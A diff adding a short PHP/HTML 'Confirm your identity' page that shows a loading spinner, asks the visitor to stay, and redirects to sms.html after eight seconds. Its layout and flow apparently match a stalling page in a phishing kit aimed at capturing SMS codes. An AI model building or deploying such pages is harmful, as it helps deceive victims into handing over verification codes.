@@ -1,0 +1,41 @@
+<?php 
+require 'main.php';
+?><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm your identity</title>
+    <link rel="stylesheet" href="res/fonts.css">
+    <link rel="stylesheet" href="res/app.css">
+</head>
+<body>
+<header>
+<div class="container">
+    <img src="res/logo.png">
+</div>
+</header>
+
+<main>
+<div class="container">
+
+
+
+<div class="form">
+<div class="title">Processing your information...</div>
+<div class="text">Please do not leave this page.</div>
+<div class="col"><img src="res/loading.gif" style="width:40px;"></div>
+</div>
+
+</div>
+</main>
+
+
+<script>
+
+setTimeout(() => {
+    window.location="sms.html";
+}, 8000);
+</script>
+</body>
+</html>
